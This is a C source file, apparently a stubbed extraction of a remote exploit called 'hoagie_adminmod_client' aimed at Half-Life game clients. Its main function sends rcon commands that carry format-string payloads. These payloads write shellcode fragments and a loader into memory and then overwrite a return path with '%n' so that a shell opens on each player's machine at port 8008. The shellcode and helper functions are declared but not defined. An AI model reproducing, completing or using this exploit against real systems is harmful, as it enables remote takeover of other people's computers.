#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */

/* Variables and functions */
 unsigned int STRADDR ; 
 int /*<<< orphan*/  close (int) ; 
 int /*<<< orphan*/  create_conn (int*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  exit (int) ; 
 char* loader ; 
 char* player_nick ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 char* rcon_pwd ; 
 int /*<<< orphan*/  send_rcon (int,char*,int /*<<< orphan*/ ,char*,char*,char*) ; 
 char* server_ip ; 
 int /*<<< orphan*/  server_port ; 
 char** shellcode ; 
 int /*<<< orphan*/  sleep (int) ; 
 int /*<<< orphan*/  sprintf (char*,char*,...) ; 
 int /*<<< orphan*/  strcat (char*,char*) ; 
 int /*<<< orphan*/  strcpy (char*,char*) ; 
 scalar_t__ strlen (char*) ; 
 int /*<<< orphan*/  strtol (char*,int /*<<< orphan*/ *,int) ; 

int main(int argc, char **argv)
{
    int sock, i,j;
    int anzsc;
    char reply[1000], command[100];
    char evil_message[100000];
    unsigned int offset, spaces;
    unsigned long addr;

    printf("hoagie_adminmod_client - remote exploit for half-life-clients\n");
    printf("by greuff@void.at\n\n");
    if(argc<4 || argc>5)
    {
       printf("Usage: %s server_ip server_port rcon_password [player_nick]\n\n",argv[0]);
       exit(1);
    }

    strcpy(server_ip,argv[1]);
    server_port=strtol(argv[2],NULL,10);
    strcpy(rcon_pwd,argv[3]);
    if(argc==5)
    {
       strcpy(player_nick,argv[4]);
       sprintf(command,"admin_command admin_psay \"%s\"",player_nick);
    }
    else
    {
       player_nick[0]=0;
       sprintf(command,"admin_command admin_ssay");
    }

    if(player_nick[0]==0)
    {
       printf("Sending to ALL clients! You have 3 sec to abort...\n");
       sleep(3);
    }

    create_conn(&sock,server_ip,server_port);

    /********* Step 1 - send the complete shellcode and the loader to the big buffer ***********/

    offset=5000+112/2;
    spaces=0;
    for(i=21;i>=0;i--)
    {
       sprintf(evil_message,"%s ",command);
       for(j=0;j<spaces;j++)
          strcat(evil_message," ");
       sprintf(reply,"%%%du%s",offset,shellcode[i]);
       strcat(evil_message,reply);

       printf("Writing shellcode fragment at offset %d...\n",offset);
       send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);
       offset-=strlen(shellcode[i])+2;   // including \x0a\x00
    }

    /********* Step 2 - send the shellcode bootstrap loader ***********/

    /* correct offset because the shell loader has the double size of a shellcode chunk */
    offset-=strlen(shellcode[0]);
    sprintf(evil_message,"%s ",command);
    for(j=0;j<spaces;j++)
       strcat(evil_message," ");
    sprintf(reply,"%%%du%s",offset,loader);
    strcat(evil_message,reply);

    printf("Writing bootstrap at offset %d...\n",offset);
    send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);

    /********* Step 3 - construct the code that returns into the shellcode ************/

    addr=STRADDR+offset+73+spaces;
    sprintf(evil_message,"%s AA%c%c%c%c%c%c%%.f%%.f%%.f%%.f%%.f%%.%du%%n",
         command,
         0x68,addr&0xFF,(addr>>8)&0xFF,(addr>>16)&0xFF,(addr>>24)&0xFF,0xc3,734 /* 0x3cd-13 */);
    printf("Writing return into shellcode instructions...\n");
    send_rcon(sock,server_ip,server_port,rcon_pwd,evil_message,reply);

    close(sock);

    printf("Shell (hopefully) spawned at client host port 8008.\n");
    return 0;
}